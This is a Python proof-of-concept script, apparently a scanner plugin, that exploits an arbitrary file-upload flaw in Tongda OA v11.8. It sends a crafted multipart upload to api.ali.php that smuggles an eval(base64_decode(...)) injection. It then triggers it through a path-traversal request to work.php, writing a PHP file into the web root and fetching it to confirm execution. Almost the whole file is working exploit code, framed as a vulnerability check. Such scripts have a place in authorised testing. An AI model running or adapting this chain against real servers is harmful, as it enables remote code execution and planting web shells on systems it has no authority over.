import requests
import urllib, re, random, string
import base64,time

def verify(url):
    relsult = {
        'name': '通达OA v11.8 api.ali.php任意文件上传漏洞',
        'vulnerable': False,
        'attack': True,
        'about': 'http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html',
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    filename = "fb6790f7.php"
    shell = f'<?php echo "{randstr1}"."{randstr2}";'
    bs64_payload = base64.b64encode(f"file_put_contents('../../{filename}','{shell}');".encode()).decode()
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae',
    }
    vurl1 = urllib.parse.urljoin(url, "/mobile/api/api.ali.php")
    vurl2 = urllib.parse.urljoin(url, f"/inc/package/work.php?id=../../../../../myoa/attach/approve_center/{time.strftime('%y%m', time.localtime())}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f7")
    verify_url = urllib.parse.urljoin(url, f"/{filename}")
    data1 = '--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="file"; filename="fb6790f7.json"\r\nContent-Type: application/octet-stream\r\n\r\n{"modular":"AllVariable","a":"%s","dataAnalysis":"{\\"a\\":\\"錦\',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}\r\n--502f67681799b07e4de6b503655f5cae--' % (bs64_payload)
    try:
        rep = requests.post(vurl1, headers=headers, timeout=timeout, data=data1.encode('utf-8').decode('latin-1'), verify=False)
        if rep.status_code == 200:
            rep2 = requests.get(vurl2, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200:
                verify_rep = requests.get(verify_url, headers=headers, timeout=timeout, data=data1, verify=False)
                if verify_rep.status_code == 200 and re.search(randstr1 + randstr2, verify_rep.text):
                    relsult['vulnerable'] = True
                    relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

